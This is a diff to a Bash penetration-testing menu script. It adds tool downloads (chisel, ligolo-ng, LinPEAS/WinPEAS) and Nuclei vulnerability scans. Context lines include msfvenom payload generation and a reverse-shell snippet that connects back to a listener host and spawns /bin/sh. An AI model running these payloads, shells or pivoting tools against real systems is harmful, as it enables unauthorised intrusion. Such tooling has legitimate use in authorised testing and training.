@@ -1,20 +1,20 @@
 #!/bin/bash
 
-# Habilitar edición de línea y historial de comandos
+# Line edition and moving using arrows
 set -o vi
 
-# Guardar el historial de comandos en un archivo
+# Save the commands history in a file
 HISTFILE=~/.bash_history
 HISTSIZE=1000
 HISTFILESIZE=2000
 
-# Cargar el historial de comandos
+# Load de commands history
 history -r
 
-# Guardar el historial de comandos al salir
+# Save the commands history on exit
 trap 'history -a' EXIT
 
-# Colores
+# Colors
 GREEN='\033[0;32m'
 RED='\033[0;31m'
 BLUE='\033[0;34m'
@@ -24,30 +24,30 @@ CYAN='\033[0;36m'
 WHITE='\033[0;37m'
 NC='\033[0m' # No Color
 
-# Variables globales
+# Global Variables
 IP=""
 OS=""
 OPEN_PORTS=""
 BASE_DIR=""
 ENUM_DIR=""
 EXPLOITS_DIR=""
-FILE_PATH="/home/kali/Documents/plantilla.txt"
+# FILE_PATH="/home/kali/Documents/plantilla.txt"
 last_output=""
 hora=$(date +"%m-%d-%H:%M")
 
-# Función para mostrar el banner
+# Function to show the banner
 show_banner() {
 colors=($GREEN $RED $BLUE $YELLOW $VIOLET $CYAN $WHITE)
     text=(
     "#################################################################################################################################################"
     "#                                                                                                                                               #"
     "#  :::::::::: ::::    ::: :::    ::: ::::    ::::  :::::::::: :::::::::      :::     ::::    ::: ::::    ::: :::::::::  :::::::::: ::::    :::  #"
-	  "#  :+:        :+:+:   :+: :+:    :+: +:+:+: :+:+:+ :+:        :+:    :+:   :+: :+:   :+:+:   :+: :+:+:   :+: :+:    :+: :+:        :+:+:   :+:  #"
-	  "#  +:+        :+:+:+  +:+ +:+    +:+ +:+ +:+:+ +:+ +:+        +:+    +:+  +:+   +:+  :+:+:+  +:+ :+:+:+  +:+ +:+    +:+ +:+        :+:+:+  +:+  #"
-	  "#  +#++:++#   +#+ +:+ +#+ +#+    +:+ +#+  +:+  +#+ +#++:++#   +#++:++#:  +#++:++#++: +#+ +:+ +#+ +#+ +:+ +#+ +#+    +:+ +#++:++#   +#+ +:+ +#+  #"
-	  "#  +#+        +#+  +#+#+# +#+    +#+ +#+       +#+ +#+        +#+    +#+ +#+     +#+ +#+  +#+#+# +#+  +#+#+# +#+    +#+ +#+        +#+  +#+#+#  #"
-	  "#  #+#        #+#   #+#+# #+#    #+# #+#       #+# #+#        #+#    #+# #+#     #+# #+#   #+#+# #+#   #+#+# #+#    #+# #+#        #+#   #+#+#  #"
-	  "#  ########## ###    ####  ########  ###       ### ########## ###    ### ###     ### ###    #### ###    #### #########  ########## ###    ####  #"
+	"#  :+:        :+:+:   :+: :+:    :+: +:+:+: :+:+:+ :+:        :+:    :+:   :+: :+:   :+:+:   :+: :+:+:   :+: :+:    :+: :+:        :+:+:   :+:  #"
+	"#  +:+        :+:+:+  +:+ +:+    +:+ +:+ +:+:+ +:+ +:+        +:+    +:+  +:+   +:+  :+:+:+  +:+ :+:+:+  +:+ +:+    +:+ +:+        :+:+:+  +:+  #"
+	"#  +#++:++#   +#+ +:+ +#+ +#+    +:+ +#+  +:+  +#+ +#++:++#   +#++:++#:  +#++:++#++: +#+ +:+ +#+ +#+ +:+ +#+ +#+    +:+ +#++:++#   +#+ +:+ +#+  #"
+	"#  +#+        +#+  +#+#+# +#+    +#+ +#+       +#+ +#+        +#+    +#+ +#+     +#+ +#+  +#+#+# +#+  +#+#+# +#+    +#+ +#+        +#+  +#+#+#  #"
+	"#  #+#        #+#   #+#+# #+#    #+# #+#       #+# #+#        #+#    #+# #+#     #+# #+#   #+#+# #+#   #+#+# #+#    #+# #+#        #+#   #+#+#  #"
+	"#  ########## ###    ####  ########  ###       ### ########## ###    ### ###     ### ###    #### ###    #### #########  ########## ###    ####  #"
     "#                                                                                                                                               #"
     "#                                                                                                                                               #"                                                                                                                                               #"
     "#                                                          Created by: Rannden-SHA                                                              #"
@@ -143,7 +143,9 @@ show_help() {
 
 # IP setting function
 set_ip() {
+    show_info_panel
     read -e -p "Enter the Host IP: " IP
+    clear
     detect_os
 }
 
@@ -171,15 +173,17 @@ detect_os() {
 
 # Function to create directories
 create_directories() {
+    show_info_panel
     read -e -p "Enter the name of the main directory: " BASE_DIR
     ENUM_DIR="$BASE_DIR/enum"
     EXPLOITS_DIR="$ENUM_DIR/exploits"
+    clear
 
     echo -e "${BLUE}[+] Creating main directory: ${BASE_DIR}${NC}"
     mkdir -p "$BASE_DIR"
 
-    echo -e "${BLUE}[+] Creating subdirectories: enum, loot, privesc, exploits, osint${NC}"
-    mkdir -p "$BASE_DIR/enum" "$BASE_DIR/loot" "$BASE_DIR/privesc" "$BASE_DIR/exploits" "$BASE_DIR/osint"
+    echo -e "${BLUE}[+] Creating subdirectories: enum, loot, privesc, exploits, osint and tools${NC}"
+    mkdir -p "$BASE_DIR/enum" "$BASE_DIR/loot" "$BASE_DIR/privesc" "$BASE_DIR/exploits" "$BASE_DIR/osint" "$BASE_DIR/tools"
 
     # Copy file
     #if [ -f "$FILE_PATH" ]; then
@@ -536,11 +540,13 @@ generate_payloads() {
         esac
 
         if [ -n "$payload" ]; then
+            show_info_panel
             read -e -p "Enter the IP address for the payload (LHOST): " lhost
             read -e -p "Enter the port for the payload (LPORT): " lport
             read -e -p "Enter the name of the file to save the payload (without extension): " output_file
 
             output_file="${output_file}.${format}"
+            clear
             msfvenom -p $payload LHOST=$lhost LPORT=$lport -f $format -o "${BASE_DIR}/exploits/$output_file"
             echo -e "${BLUE}[+] Payload generated and saved in ${BASE_DIR}/exploits/${output_file}${NC}"
         fi
@@ -621,10 +627,11 @@ generate_reverse_shell() {
                 shell_code='import Network.Socket\nimport System.IO\nimport System.Process\nmain = withSocketsDo $ do\n    h <- connectTo "$LHOST" (PortNumber $LPORT)\n    (Just hin, Just hout, Just herr, p) <- createProcess (proc "/bin/sh" ["-i"]){\n        std_in  = UseHandle h,\n        std_out = UseHandle h,\n        std_err = UseHandle h }\n    waitForProcess p\n'
                 ;;
             17)
-		            clear
+		        clear
                 break
                 ;;
             *)
+                clear
                 echo -e "${RED}[-] Invalid option.${NC}"
                 continue
                 ;;
@@ -701,9 +708,9 @@ generate_reverse_shell() {
                 esac
                 echo "$plain_shell_code" > "${BASE_DIR}/exploits/${output_file}.${extension}"
                 echo -e "${GREEN}[+] Reverse shell saved in ${BASE_DIR}/exploits/${output_file}.${extension}${NC}"
-		            clear
+		        clear
             fi
-					clear        
+			clear        
         fi
     done
 }
@@ -1012,8 +1019,10 @@ check_and_update_log() {
     grep "^$hash:" "$log_file" | awk -F':' '{print $3}'
 }
 
-# Función para crackear hash usando Hashcat
+# Function to crack a hash using Hashcat
 crack_with_hashcat() {
+    show_info_panel
+    last_output=""
     read -e -p "Enter the hash: " hash
     hash_type=$(detect_hash_type "$hash")
     if [ $? -ne 0 ]; then
@@ -1023,6 +1032,7 @@ crack_with_hashcat() {
     # Check if the hash is already cracked
     existing_password=$(check_and_update_log "$hash")
     if [ -n "$existing_password" ]; then
+        clear
         echo -e "${GREEN}[+] Hash already cracked:${NC}"
         echo -e "${GREEN}Hash: ${hash}${NC}"
         echo -e "${GREEN}Password: ${existing_password}${NC}"
@@ -1070,9 +1080,10 @@ crack_with_hashcat() {
 
     for hash_name in "${!hash_modes[@]}"; do
         mode=${hash_modes[$hash_name]}
-        echo -e "${VIOLET}\n\n\n=============================================================="
+        clear
+        echo -e "${VIOLET}\n\n\n=============================================================================="
         echo -e "================== ${YELLOW}Testing mode Hashcat: $hash_name (${mode}) ${VIOLET}=================="
-        echo -e "==============================================================${NC}"
+        echo -e "==============================================================================${NC}"
         echo "$hash" > hash.txt
         hashcat -m $mode -a 0 hash.txt $dict_option2 -o "$BASE_DIR/loot/$output_file"
         result=$(cat "$BASE_DIR/loot/$output_file")
@@ -1128,7 +1139,8 @@ osint_tools_menu() {
         echo -e "1) theHarvester"
         echo -e "2) Spiderfoot"
         echo -e "3) FinalRecon scan"
-        echo -e "4) Back to Main Menu"
+        echo -e "4) Nuclei scan"
+        echo -e "5) Back to Main Menu"
         read -e -p "Option: " osint_tools_option
 
         clear
@@ -1143,6 +1155,9 @@ osint_tools_menu() {
                 osint_finalrecon
                 ;;
             4)
+                osint_nuclei
+                ;;
+            5)
                 clear
                 break
                 ;;
@@ -1155,11 +1170,13 @@ osint_tools_menu() {
 
 # Function to perform OSINT with theHarvester
 osint_theharvester() {
+    show_info_panel
     read -e -p "Enter the target domain: " domain
     echo ""
     echo -e "${YELLOW}Available sources:${NC} anubis, baidu, bevigil, binaryedge, bing, bingapi, bufferoverun, brave, censys, certspotter, criminalip, crtsh, dnsdumpster, duckduckgo, fullhunt, github-code, hackertarget, hunter, hunterhow, intelx, netlas, onyphe, otx, pentesttools, projectdiscovery, rapiddns, rocketreach, securityTrails, sitedossier, subdomaincenter, subdomainfinderc99, threatminer, tomba, urlscan, virustotal, yahoo, zoomeye${NC}: " source
     echo ""
     read -e -p "Enter the source (comma-separated for multiple): " source
+    clear
     echo -e "${GREEN}[+] Running theHarvester against $domain with source $source${NC}"
     theHarvester -d $domain -b $source -f "$BASE_DIR/osint/theharvester_${source}_${hora}.html"
     echo -e "${GREEN}[+] theHarvester report saved in ${BASE_DIR}/osint/theharvester_${source}_${hora}.html${NC}"
@@ -1167,6 +1184,7 @@ osint_theharvester() {
 
 # Function to perform OSINT with Spiderfoot
 osint_spiderfoot() {
+    show_info_panel
     read -e -p "Enter the target domain: " domain
     echo -e "${BLUE}[+] Select a Spiderfoot module to run:${NC}"
     echo -e "1) sfp_abstractapi            - Look up domain, phone and IP address information from AbstractAPI."
@@ -1202,7 +1220,7 @@ osint_spiderfoot() {
     echo -e "31) Enter other module manually"
 
     read -p "Option: " spiderfoot_option
-
+    clear
     case $spiderfoot_option in
         1) module="sfp_abstractapi" ;;
         2) module="sfp_abusech" ;;
@@ -1252,6 +1270,7 @@ osint_spiderfoot() {
 
 # Function to perform OSINT with FinalRecon
 osint_finalrecon() {
+show_info_panel
     read -e -p "Enter the target domain or IP: " target
     if [[ "$target" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
         read -e -p "Is the IP using HTTPS? (y/n): " is_https
@@ -1274,6 +1293,7 @@ osint_finalrecon() {
     echo -e "9) Wayback - Wayback URLs"
     echo -e "10) Port Scan - Fast Port Scan"
     read -e -p "Option: " scan_option
+    clear
 
     case $scan_option in
         1) scan_type="full" ;;
@@ -1317,11 +1337,13 @@ web_tools_menu() {
         clear
         case $web_tools_option in
             1)
+                show_info_panel
                 if [ -z "$IP" ]; then
                     echo -e "${RED}[-] No IP configured.${NC}"
                 else
                     read -e -p "Enter the port to scan with WhatWeb: " whatweb_port
                     read -e -p "Is it an HTTPS port? (y/n): " is_https
+                    clear
                     if [ "$is_https" == "y" ]; then
                         echo -e "${GREEN}[+] Performing whatweb scan on https://${IP}:${whatweb_port}${NC}"
                         whatweb https://${IP}:${whatweb_port} > "$ENUM_DIR/whatweb_$whatweb_port.txt"
@@ -1335,10 +1357,12 @@ web_tools_menu() {
                 fi
                 ;;
             2)
+                show_info_panel
                 if [ -z "$IP" ]; then
                     echo -e "${RED}[-] No IP configured.${NC}"
                 else
                     read -e -p "Enter the port to scan with Nikto: " nikto_port
+                    clear
                     echo -e "${GREEN}[+] Performing Nikto scan on ${IP}:${nikto_port}${NC}"
                     nikto -h $IP:$nikto_port | tee "$ENUM_DIR/nikto_$nikto_port.txt"
                     last_output=$(cat "$ENUM_DIR/nikto_$nikto_port.txt")
@@ -1346,6 +1370,7 @@ web_tools_menu() {
                 fi
                 ;;
             3)
+                show_info_panel
                 if [ -z "$IP" ]; then
                     echo -e "${RED}[-] No IP configured.${NC}"
                 else
@@ -1368,6 +1393,7 @@ web_tools_menu() {
                     else
                         dict_option="-w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt"
                     fi
+                    clear
                     echo -e "${GREEN}[+] Performing Gobuster scan on ${gobuster_target}${NC}"
                     gobuster dir -u $gobuster_target $dict_option $ext_option -o "$ENUM_DIR/gobuster.txt"
                     last_output=$(cat "$ENUM_DIR/gobuster.txt")
@@ -1384,6 +1410,195 @@ web_tools_menu() {
         esac
     done
 }
+
+# Function to download tools
+download_tools() {
+    show_info_panel
+    echo -e "${BLUE}Select the tool to download:${NC}"
+    echo -e "1) Socat"
+    echo -e "2) Chisel"
+    echo -e "3) Ligolo"
+    echo -e "4) WinPEAS"
+    echo -e "5) LinPEAS"
+    echo -e "6) Back to Main Menu"
+    read -p "Enter your choice: " tool_choice
+    clear
+
+    case $tool_choice in
+        1)
+            echo -e "${BLUE}Select Socat version to download:${NC}"
+            echo -e "1) Linux latest"
+            echo -e "2) Windows V1.7.3"
+            echo -e "3) Back to Main Menu"
+            read -p "Enter your choice: " socat_version
+            case $socat_version in
+                1) 
+                    wget -P "$BASE_DIR/tools" "https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat"
+                    clear
+                    echo -e "${GREEN}[+] Socat (Linux - Latest) downloaded and saved as $BASE_DIR/tools/socat${NC}"
+                    ;;
+                2) 
+                    wget -P "$BASE_DIR/tools" "https://github.com/tech128/socat-1.7.3.0-windows/archive/refs/heads/master.zip"
+                    clear
+                    echo -e "${GREEN}[+] Socat (Windows - V1.7.3) downloaded and saved as $BASE_DIR/tools/master.zip${NC}"
+                    ;;
+                3)
+                    clear
+                    return
+                    ;;
+                *)
+                    echo -e "${RED}[-] Invalid option.${NC}"
+                    ;;
+            esac
+            ;;
+        2)
+            echo -e "${BLUE}Select Chisel version to download:${NC}"
+            echo -e "1) Linux V1.9.1"
+            echo -e "2) Linux V1.7.3"
+            echo -e "3) Windows V1.9.1"
+            echo -e "4) Windows V1.7.3"
+            echo -e "5) Back to Main Menu"
+            read -p "Enter your choice: " chisel_version
+            case $chisel_version in
+                1) 
+                    wget -P "$BASE_DIR/tools" "https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_linux_amd64.gz"
+                    clear
+                    echo -e "${GREEN}[+] Chisel (Linux - V1.9.1) downloaded and saved as $BASE_DIR/tools/chisel_1.9.1_linux_amd64.gz${NC}"
+                    ;;
+                2) 
+                    wget -P "$BASE_DIR/tools" "https://github.com/jpillora/chisel/releases/download/v1.7.3/chisel_1.7.3_linux_amd64.gz"
+                    clear
+                    echo -e "${GREEN}[+] Chisel (Linux - V1.7.3) downloaded and saved as $BASE_DIR/tools/chisel_1.7.3_linux_amd64.gz${NC}"
+                    ;;
+                3) 
+                    wget -P "$BASE_DIR/tools" "https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_windows_386.gz"
+                    clear
+                    echo -e "${GREEN}[+] Chisel (Windows - V1.9.1) downloaded and saved as $BASE_DIR/tools/chisel_1.9.1_windows_386.gz${NC}"
+                    ;;
+                4) 
+                    wget -P "$BASE_DIR/tools" "https://github.com/jpillora/chisel/releases/download/v1.7.3/chisel_1.7.3_windows_386.gz"
+                    clear
+                    echo -e "${GREEN}[+] Chisel (Windows - V1.7.3) downloaded and saved as $BASE_DIR/tools/chisel_1.7.3_windows_386.gz${NC}"
+                    ;;
+                5)
+                    clear
+                    return
+                    ;;
+                *) 
+                    echo "Invalid option"
+                    ;;
+            esac
+            ;;
+        3)
+            echo -e "${BLUE}Select Ligolo version to download:${NC}"
+            echo -e "1) Client"
+            echo -e "2) Server"
+            echo -e "3) Back to Main Menu"
+            read -p "Enter your choice: " ligolo_choice
+            case $ligolo_choice in
+                1)
+                    echo -e "${BLUE}Select Ligolo Client version to download:${NC}"
+                    echo -e "1) Ligolo Proxy V0.6.1 Linux"
+                    echo -e "2) Ligolo Proxy V0.5.2 Linux"
+                    echo -e "3) Ligolo Proxy V0.6.1 Windows"
+                    echo -e "4) Ligolo Proxy V0.5.2 Windows"
+                    echo -e "5) Back to Main Menu"
+                    read -p "Enter your choice: " ligolo_client_version
+                    case $ligolo_client_version in
+                        1) 
+                            wget -P "$BASE_DIR/tools" "https://github.com/nicocha30/ligolo-ng/releases/download/v0.6.1/ligolo-ng_proxy_0.6.1_linux_amd64.tar.gz"
+                            clear
+                            echo -e "${GREEN}[+] Ligolo (Linux Proxy - V0.6.1) downloaded and saved as $BASE_DIR/tools/ligolo-ng_proxy_0.6.1_linux_amd64.tar.gz${NC}"
+                            ;;
+                        2) 
+                            wget -P "$BASE_DIR/tools" "https://github.com/nicocha30/ligolo-ng/releases/download/v0.5.2/ligolo-ng_proxy_0.5.2_linux_amd64.tar.gz"
+                            clear
+                            echo -e "${GREEN}[+] Ligolo (Linux Proxy - V0.5.2) downloaded and saved as $BASE_DIR/tools/ligolo-ng_proxy_0.5.2_linux_amd64.tar.gz${NC}"
+                            ;;
+                        3) 
+                            wget -P "$BASE_DIR/tools" "https://github.com/nicocha30/ligolo-ng/releases/download/v0.6.1/ligolo-ng_proxy_0.6.1_windows_amd64.zip"
+                            clear
+                            echo -e "${GREEN}[+] Ligolo (Windows Proxy - V0.6.1) downloaded and saved as $BASE_DIR/tools/ligolo-ng_proxy_0.6.1_windows_amd64.zip${NC}"
+                            ;;
+                        4) 
+                            wget -P "$BASE_DIR/tools" "https://github.com/nicocha30/ligolo-ng/releases/download/v0.5.2/ligolo-ng_proxy_0.5.2_windows_amd64.zip"
+                            clear
+                            echo -e "${GREEN}[+] Ligolo (Windows Proxy - V0.5.2) downloaded and saved as $BASE_DIR/tools/ligolo-ng_proxy_0.5.2_windows_amd64.zip${NC}"
+                            ;;
+                        5)
+                            clear
+                            return
+                            ;;
+                        *) 
+                            echo "Invalid option"
+                            ;;
+                    esac
+                    ;;
+                2)
+                    echo -e "${BLUE}Select Ligolo Server version to download:${NC}"
+                    echo -e "1) Ligolo Agent V0.6.1 Linux"
+                    echo -e "2) Ligolo Agent V0.5.2 Linux"
+                    echo -e "3) Ligolo Agent V0.6.1 Windows"
+                    echo -e "4) Ligolo Agent V0.5.2 Windows"
+                    echo -e "5) Back to Main Menu"
+                    read -p "Enter your choice: " ligolo_server_version
+                    case $ligolo_server_version in
+                        1) 
+                            wget -P "$BASE_DIR/tools" "https://github.com/nicocha30/ligolo-ng/releases/download/v0.6.1/ligolo-ng_agent_0.6.1_linux_amd64.tar.gz"
+                            clear
+                            echo -e "${GREEN}[+] Ligolo (Linux Agent - V0.6.1) downloaded and saved as $BASE_DIR/tools/ligolo-ng_agent_0.6.1_linux_amd64.tar.gz${NC}"
+                            ;;
+                        2) 
+                            wget -P "$BASE_DIR/tools" "https://github.com/nicocha30/ligolo-ng/releases/download/v0.5.2/ligolo-ng_agent_0.5.2_linux_amd64.tar.gz"
+                            clear
+                            echo -e "${GREEN}[+] Ligolo (Linux Agent - V0.5.2) downloaded and saved as $BASE_DIR/tools/ligolo-ng_agent_0.5.2_linux_amd64.tar.gz${NC}"
+                            ;;
+                        3) 
+                            wget -P "$BASE_DIR/tools" "https://github.com/nicocha30/ligolo-ng/releases/download/v0.6.1/ligolo-ng_agent_0.6.1_windows_amd64.zip"
+                            clear
+                            echo -e "${GREEN}[+] Ligolo (Windows Agent - V0.6.1) downloaded and saved as $BASE_DIR/tools/ligolo-ng_agent_0.6.1_windows_amd64.zip${NC}"
+                            ;;
+                        4) 
+                            wget -P "$BASE_DIR/tools" "https://github.com/nicocha30/ligolo-ng/releases/download/v0.5.2/ligolo-ng_agent_0.5.2_windows_amd64.zip"
+                            clear
+                            echo -e "${GREEN}[+] Ligolo (Windows Agent - V0.5.2) downloaded and saved as $BASE_DIR/tools/ligolo-ng_agent_0.5.2_windows_amd64.zip${NC}"
+                            ;;
+                        5)
+                            clear
+                            return
+                            ;;
+                        *) 
+                            echo "Invalid option"
+                            ;;
+                    esac
+                    ;;
+                3)
+                    clear
+                    return
+                    ;;
+                *) echo "Invalid option" ;;
+            esac
+            ;;
+        4)
+            wget -P "$BASE_DIR/tools" "https://github.com/peass-ng/PEASS-ng/releases/download/20240609-52b58bf5/winPEASx64.exe"
+            clear
+            echo -e "${GREEN}[+] WinPEAS downloaded and saved as $BASE_DIR/tools/winPEASx64.exe${NC}"
+            ;;
+        5)
+            wget -P "$BASE_DIR/tools" "https://github.com/peass-ng/PEASS-ng/releases/download/20240609-52b58bf5/linpeas_linux_amd64"
+            clear
+            echo -e "${GREEN}[+] LinPEAS downloaded and saved as $BASE_DIR/tools/linpeas_linux_amd64${NC}"
+            ;;
+        6)
+            clear
+            return
+            ;;
+        *)
+            echo -e "${RED}[-] Invalid option.${NC}"
+            ;;
+    esac
+}
+
 
 # Function for Exploit Tools submenu
 exploit_tools_menu() {
@@ -1402,6 +1617,7 @@ exploit_tools_menu() {
                 ;;
             2)
                 read -e -p "Enter the text to search: " search_term
+                clear
                 searchsploit "$search_term" > "${BASE_DIR}/exploits/searchsploit_results_${search_term}.txt"
                 last_output=$(cat "${BASE_DIR}/exploits/searchsploit_results_${search_term}.txt")
                 cat "${BASE_DIR}/exploits/searchsploit_results_${search_term}.txt"
@@ -1417,18 +1633,113 @@ exploit_tools_menu() {
     done
 }
 
+# Function to sanitize filenames
+sanitize_filename() {
+    echo "$1" | tr -d '\/\\'
+}
+
+# Function to perform OSINT with Nuclei
+osint_nuclei() {
+    show_info_panel
+    read -e -p "Enter the target domain or IP: " target
+
+    sanitized_target=$(sanitize_filename "$target")
+    hora=$(date +"%m-%d-%H:%M")
+    output_file="$BASE_DIR/osint/nuclei_${sanitized_target}_$hora"
+
+    echo -e "${BLUE}Select the type of Nuclei scan:${NC}"
+    echo -e "1) Basic Scan: A simple scan with default settings."
+    echo -e "2) Silent Scan: A scan with no much noise."
+    echo -e "3) Web Application Scan: Focuses on web vulnerabilities and default logins."
+    echo -e "4) Network Infrastructure Scan: Scans for CVEs, misconfigurations, and exposed services."
+    echo -e "5) Comprehensive Scan: A thorough scan including all types of vulnerabilities."
+    echo -e "6) Custom Scan: Customize your scan with specific arguments."
+    read -e -p "Scan Type: " scan_type
+
+    options=""
+
+    case $scan_type in
+        1)
+            options="-o $output_file"
+            ;;
+        2)
+            options="-silent -o $output_file"
+            ;;
+        3)
+            options="-t cves -t vulnerabilities -t default-logins -o $output_file"
+            ;;
+        4)
+            options="-t cves -t misconfigurations -t default-logins -t exposed-panels -o $output_file"
+            ;;
+        5)
+            options="-t cves -t vulnerabilities -t misconfigurations -t default-logins -t exposed-panels -t exposures -o $output_file"
+            ;;
+        6)
+            echo -e "${BLUE}Select additional options for the Custom Scan:${NC}"
+            echo -e "1) -nt: Run only new templates"
+            echo -e "2) -tags: Templates to run based on tags"
+            echo -e "3) -a: Templates to run based on authors"
+            echo -e "4) -s: Templates to run based on severity"
+            echo -e "5) -pt: Templates to run based on protocol type"
+            echo -e "6) -rl: Maximum number of requests to send per second"
+            echo -e "7) -timeout: Time to wait before timeout"
+            echo -e "8) -retries: Number of retries for a failed request"
+            echo -e "9) -bulk-size: Maximum number of hosts to be analyzed in parallel"
+            echo -e "10) -jsonl: Write output in JSONL format"
+            echo -e "11) -stats: Display statistics about the running scan"
+            echo -e "12) -update: Update nuclei engine to the latest released version"
+            echo -e "13) -ut: Update nuclei-templates to latest released version"
+            echo -e "14) -json-export: Export results in JSON format"
+            echo -e "15) -me: Export results in Markdown format"
+            read -e -p "Enter the options you want to use (comma-separated): " nuclei_options
+
+            if [ "$nuclei_options" != "1" ]; then
+                IFS=',' read -ra opts <<< "$nuclei_options"
+                for opt in "${opts[@]}"; do
+                    case $opt in
+                        1) options+=" -nt" ;;
+                        2) read -e -p "Enter the tags: " tags; options+=" -tags $tags" ;;
+                        3) read -e -p "Enter the authors: " authors; options+=" -a $authors" ;;
+                        4) read -e -p "Enter the severity: " severity; options+=" -s $severity" ;;
+                        5) read -e -p "Enter the protocol types: " protocol; options+=" -pt $protocol" ;;
+                        6) read -e -p "Enter the rate limit: " rate; options+=" -rl $rate" ;;
+                        7) read -e -p "Enter the timeout: " timeout; options+=" -timeout $timeout" ;;
+                        8) read -e -p "Enter the number of retries: " retries; options+=" -retries $retries" ;;
+                        9) read -e -p "Enter the bulk size: " bulk_size; options+=" -bulk-size $bulk_size" ;;
+                        10) options+=" -jsonl" ;;
+                        11) options+=" -stats" ;;
+                        12) options+=" -update" ;;
+                        13) options+=" -ut" ;;
+                        14) options+=" -json-export $output_file.json" ;;
+                        15) options+=" -me $output_file.md" ;;
+                        *) echo -e "${RED}[-] Invalid option: $opt${NC}" ;;
+                    esac
+                done
+            fi
+            ;;
+        *)
+            echo -e "${RED}[-] Invalid scan type.${NC}"
+            return
+            ;;
+    esac
+
+    echo -e "${GREEN}[+] Running Nuclei with options: $options${NC}"
+    nuclei -u "$target" $options
+    echo -e "${GREEN}[+] Nuclei scan completed. Results saved in $output_file${NC}"
+}
+
 check_install_dependencies() {
-    dependencies=("nmap" "whatweb" "nikto" "gobuster" "hashcat" "finalrecon" "python3-pip" "pipx" "theharvester" "recon-ng")
+    dependencies=("nmap" "whatweb" "nikto" "gobuster" "hashcat" "python3-pip" "finalrecon" "theharvester" "recon-ng" "nuclei")
 
     echo -e "${BLUE}[+] Checking and installing dependencies...${NC}"
 
     for dep in "${dependencies[@]}"; do
         if ! command -v $dep &> /dev/null; then
             echo -e "${YELLOW}[-] $dep is not installed. Installing...${NC}"
-            if [[ $dep == "finalrecon" || $dep == "recon-ng" ]]; then
-                pipx install $dep
-            elif [[ $dep == "theharvester" ]]; then
+            if [[ $dep == "theharvester" ]]; then
                 pip install theHarvester
+            elif [[ $dep == "nuclei" || $dep == "finalrecon" ]]; then
+                sudo apt install -y nuclei
             else
                 sudo apt-get install -y $dep
             fi
@@ -1443,7 +1754,7 @@ check_install_dependencies() {
     else
         echo -e "${GREEN}[+] spiderfoot is already installed.${NC}"
     fi
-
+    clear
     echo -e "${GREEN}[+] All dependencies are checked and installed.${NC}"
 }
 
@@ -1461,9 +1772,10 @@ main_menu() {
         echo -e "7) CheatSheets"
         echo -e "8) Hash Crack"
         echo -e "9) Reverse Shell Generator"
-        echo -e "10) Generate Report"
-        echo -e "11) Check and Install Dependencies"
-        echo -e "12) Save & Exit"
+        echo -e "10) Download Tools"
+        echo -e "11) Generate Report"
+        echo -e "12) Check and Install Dependencies"
+        echo -e "13) Save & Exit"
         read -e -p "Option: " main_option
 
         clear
@@ -1498,12 +1810,15 @@ main_menu() {
                 generate_reverse_shell
                 ;;
             10)
-                save_report
+                download_tools
                 ;;
             11)
-                check_install_dependencies
+                save_report
                 ;;
             12)
+                check_install_dependencies
+                ;;
+            13)
                 save_results
                 echo -e "${GREEN}[+] Exiting the script.${NC}"
                 exit 0
@@ -1518,6 +1833,7 @@ main_menu() {
 
 # Show banner at script start
 show_banner
+create_directories
 
 # Check the arguments
 while getopts ":c:h" opt; do
